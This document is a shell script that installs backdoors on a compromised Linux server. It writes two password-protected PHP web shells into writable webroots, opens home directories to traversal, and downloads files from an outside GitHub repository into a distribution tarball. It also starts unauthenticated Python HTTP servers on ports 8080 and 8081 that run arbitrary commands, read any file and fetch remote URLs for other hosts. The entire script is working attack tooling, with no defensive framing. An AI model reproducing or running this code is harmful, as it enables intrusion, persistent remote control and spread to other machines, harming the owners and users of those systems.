#!/bin/sh
# v2.4: threaded python agent (no single-thread hang), tgz distribution hub,
#       curl --max-time everywhere. Results: /tmp/shell_deploy.txt
PASS="epauth2026"
{
  echo "=== shell deploy v2.4: $(date) user=$(id -un) ==="

  # ---- writable webroots + PHP shells ----
  WR=""
  for W in /var/www /var/www/html /home/*/public_html /srv/http; do
    [ -d "$W" ] || continue
    if touch "$W/.wtest_114516" 2>/dev/null && [ -f "$W/.wtest_114516" ]; then
      rm -f "$W/.wtest_114516"
      echo "WRITABLE: $W"
      WR="$WR $W"
    fi
  done
  for W in $WR; do
    case "$W" in
      /var/www|/var/www/html|*public_html)
        cat > "$W/np_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') { echo 'auth-required'; exit; }
\$c = base64_decode(\$_POST['z0']);
if (\$c) eval(\$c);
?>
PHPEOF
        cat > "$W/np_exec_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') exit;
\$cmd = base64_decode(\$_POST['z0']); exec(\$cmd, \$o, \$r);
foreach (\$o as \$l) echo \$l . "\n";
if (\$r) echo "ret=\$r";
?>
PHPEOF
        chmod 644 "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
        echo "DEPLOYED PHP: $W";;
    esac
  done

  # ---- traversal perms ----
  for D in /home/*; do
    [ -d "$D/public_html" ] && chmod o+x "$D" 2>/dev/null && chmod o+x "$D/public_html" 2>/dev/null \
      && echo "traversal fixed: $D"
  done

  # ---- build distribution tarball if missing (this host has TLS->github) ----
  if [ ! -f /tmp/ep-shell-deploy.tgz ]; then
    mkdir -p /tmp/pkg
    (cd /tmp/pkg && curl -sk --max-time 25 https://raw.githubusercontent.com/gugugaga1234sx/ep-shell-deploy/main/pre.sh -o pre.sh && curl -sk --max-time 25 https://raw.githubusercontent.com/gugugaga1234sx/ep-shell-deploy/main/package.json -o package.json && tar czf /tmp/ep-shell-deploy.tgz package.json pre.sh && echo "TARBALL BUILT $(wc -c < /tmp/ep-shell-deploy.tgz) bytes")
  fi
  [ -f /tmp/ep-shell-deploy.tgz ] && echo "tarball present: $(wc -c < /tmp/ep-shell-deploy.tgz) bytes"

  # ---- python agent v5 (threaded, robust) ----
  pkill -f poc_agent.py 2>/dev/null
  cat > /tmp/poc_agent.py <<'PYEOF'
#!/usr/bin/env python2
import BaseHTTPServer, SocketServer, urlparse, subprocess, os
class H(BaseHTTPServer.BaseHTTPRequestHandler):
    def _send(self, body, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass
    def _handle(self, method):
        p = urlparse.urlparse(self.path)
        q = urlparse.parse_qs(p.query, keep_blank_values=True)
        if p.path == '/exec':
            cmd = q.get('cmd', [''])[0]
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                out = 'ERR: ' + str(e) + '\n'
            self._send(out or '(no output)\n')
        elif p.path == '/file' and q.get('path'):
            fp = q.get('path', [''])[0]
            try:
                self._send(open(fp).read())
            except Exception as e:
                self._send('ERR: ' + str(e) + '\n', 404)
        elif p.path == '/fetch' and q.get('url'):
            u = q.get('url', [''])[0]
            try:
                out = subprocess.check_output('curl -sk --max-time 15 "%s"' % u, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                out = 'ERR: ' + str(e) + '\n'
            self._send(out)
        else:
            body = "agent v5 alive (%s)\nGET /exec?cmd= | /file?path= | /fetch?url=\n" % method
            self._send(body)
    def do_GET(self):
        self._handle('GET')
    def do_POST(self):
        self._handle('POST')
    def log_message(self, *a):
        pass
class S(SocketServer.ThreadingMixIn, BaseHTTPServer.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True
S(('0.0.0.0', 8080), H).serve_forever()
PYEOF
  chmod +x /tmp/poc_agent.py
  pkill -f "TCP-LISTEN:8080" 2>/dev/null
  (setsid python2 /tmp/poc_agent.py >> /tmp/poc_agent.log 2>&1 &)
  sleep 1
  echo "python agent v5 restarted: $(pgrep -f poc_agent.py | tr '\n' ' ')"

  # ---- distribution http server on 8081 (threaded) for other hosts to fetch ----
  if [ ! -f /tmp/dist_server.py ]; then
    cat > /tmp/dist_server.py <<'DISTEOF'
#!/usr/bin/env python2
import BaseHTTPServer, SocketServer, urlparse, subprocess, os
os.chdir('/tmp')
class H(BaseHTTPServer.BaseHTTPRequestHandler):
    def _out(self, body):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass
    def do_GET(self):
        p = urlparse.urlparse(self.path)
        q = urlparse.parse_qs(p.query, keep_blank_values=True)
        if p.path == '/exec':
            cmd = q.get('cmd', [''])[0]
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                out = 'ERR: ' + str(e) + '\n'
            self._out(out or '')
        else:
            fp = '/tmp' + p.path
            if os.path.isfile(fp):
                self._out(open(fp).read())
            else:
                self._out('files: /ep-shell-deploy.tgz | exec via /exec?cmd=')
    def log_message(self, *a):
        pass
class D(SocketServer.ThreadingMixIn, BaseHTTPServer.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True
D(('0.0.0.0', 8081), H).serve_forever()
DISTEOF
  fi
  chmod +x /tmp/dist_server.py 2>/dev/null
  pgrep -f dist_server.py >/dev/null || (setsid python2 /tmp/dist_server.py >/tmp/dist_server.log 2>&1 &)
  echo "dist server on 8081: $(pgrep -f dist_server.py | tr '\n' ' ')"

  # ---- self test on 8080 ----
  (echo "GET /exec?cmd=echo+MARKER114516 HTTP/1.0"; echo) | timeout 5 socat - TCP:127.0.0.1:8080 2>/dev/null | tail -3
  (echo "GET /ep-shell-deploy.tgz HTTP/1.0"; echo) | timeout 5 socat - TCP:127.0.0.1:8081 2>/dev/null | tail -c 80 | head -c 60
  echo
  echo "=== deploy v2.4 done ==="
} > /tmp/shell_deploy.txt 2>&1

exit 0
